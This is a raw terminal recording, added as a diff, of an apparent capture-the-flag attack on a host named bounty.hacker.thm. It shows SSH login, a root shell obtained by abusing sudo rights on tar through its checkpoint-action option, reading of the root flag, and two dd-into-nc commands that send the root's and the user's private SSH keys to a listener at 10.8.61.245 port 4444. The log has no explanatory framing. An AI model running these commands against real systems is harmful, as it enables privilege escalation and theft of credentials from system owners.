@@ -1,0 +1,91 @@
+Script started on 2025-03-31 21:24:48+03:00 [COMMAND="ssh lin@bounty.hacker.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+lin@bounty.hacker.thm's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+83 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Mar 31 13:22:27 2025 from 10.8.61.245
+]0;lin@bountyhacker: ~/Desktop[01;32mlin@bountyhacker[00m:[01;34m~/Desktop[00m$ sudo -l
+[sudo] password for lin: 
+Matching Defaults entries for lin on bountyhacker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+]0;lin@bountyhacker: ~/Desktop[01;32mlin@bountyhacker[00m:[01;34m~/Desktop[00m$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bi n/sh
+tar: Removing leading `/' from member names
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+root.txt
+# cat root.txt
+THM{80UN7Y_h4cK3r}
+# ls -al
+total 40
+drwx------  5 root root 4096 Jun  7  2020 .
+drwxr-xr-x 24 root root 4096 Jun  6  2020 ..
+-rw-------  1 root root 2694 Jun  7  2020 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwx------  2 root root 4096 Feb 26  2019 .cache
+drwxr-xr-x  2 root root 4096 Jun  7  2020 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   19 Jun  7  2020 root.txt
+-rw-r--r--  1 root root   66 Jun  7  2020 .selected_editor
+drwx------  2 root root 4096 Jun  7  2020 .ssh
+# ls .ssh
+id_rsa	id_rsa.pub
+# cat   dd if  =.. ssh/id_rsa stau tus=progress | nc 10.8.61.245 4444
+3+1 records in
+3+1 records out
+1766 bytes (1.8 kB, 1.7 KiB) copied, 0.00121632 s, 1.5 MB/s
+# exit
+]0;lin@bountyhacker: ~/Desktop[01;32mlin@bountyhacker[00m:[01;34m~/Desktop[00m$ cd
+]0;lin@bountyhacker: ~[01;32mlin@bountyhacker[00m:[01;34m~[00m$ ls -al
+total 116
+drwxr-xr-x 19 lin  lin  4096 Jun  7  2020 [0m[01;34m.[0m
+drwxr-xr-x  3 root root 4096 Jun  7  2020 [01;34m..[0m
+-rw-------  1 lin  lin   122 Mar 31 13:24 .bash_history
+-rw-r--r--  1 lin  lin   220 Jun  7  2020 .bash_logout
+-rw-r--r--  1 lin  lin  3790 Jun  7  2020 .bashrc
+drwx------ 14 lin  lin  4096 Jun  7  2020 [01;34m.cache[0m
+drwx------  3 lin  lin  4096 Jun  7  2020 [01;34m.compiz[0m
+drwx------ 15 lin  lin  4096 Jun  7  2020 [01;34m.config[0m
+drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 [01;34mDesktop[0m
+-rw-r--r--  1 lin  lin    25 Jun  7  2020 .dmrc
+drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 [01;34mDocuments[0m
+drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 [01;34mDownloads[0m
+drwx------  2 lin  lin  4096 Jun  7  2020 [01;34m.gconf[0m
+drwx------  3 lin  lin  4096 Jun  7  2020 [01;34m.gnupg[0m
+-rw-------  1 lin  lin  1710 Jun  7  2020 .ICEauthority
+drwx------  3 lin  lin  4096 Jun  7  2020 [01;34m.local[0m
+drwx------  5 lin  lin  4096 Jun  7  2020 [01;34m.mozilla[0m
+drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 [01;34mMusic[0m
+drwxrwxr-x  2 lin  lin  4096 Jun  7  2020 [01;34m.nano[0m
+drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 [01;34mPictures[0m
+-rw-r--r--  1 lin  lin   655 Jun  7  2020 .profile
+drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 [01;34mPublic[0m
+-rw-rw-r--  1 lin  lin    66 Jun  7  2020 .selected_editor
+drwx------  2 lin  lin  4096 Jun  7  2020 [01;34m.ssh[0m
+drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 [01;34mTemplates[0m
+drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 [01;34mVideos[0m
+-rw-------  1 lin  lin   114 Jun  7  2020 .Xauthority
+-rw-------  1 lin  lin  1204 Jun  7  2020 .xsession-errors
+-rw-------  1 lin  lin  1208 Jun  7  2020 .xsession-errors.old
+]0;lin@bountyhacker: ~[01;32mlin@bountyhacker[00m:[01;34m~[00m$ ca[K[Ko[Kls .ssh
+id_rsa  id_rsa.pub
+]0;lin@bountyhacker: ~[01;32mlin@bountyhacker[00m:[01;34m~[00m$ dd if .[K[K=.ssh/id_rsa status=progress | nc 10.8.61.245 4444
+3+1 records in
+3+1 records out
+1766 bytes (1.8 kB, 1.7 KiB) copied, 0.000992448 s, 1.8 MB/s
+]0;lin@bountyhacker: ~[01;32mlin@bountyhacker[00m:[01;34m~[00m$ exit
+logout
+Connection to bounty.hacker.thm closed.
+
+Script done on 2025-03-31 21:29:44+03:00 [COMMAND_EXIT_CODE="0"]
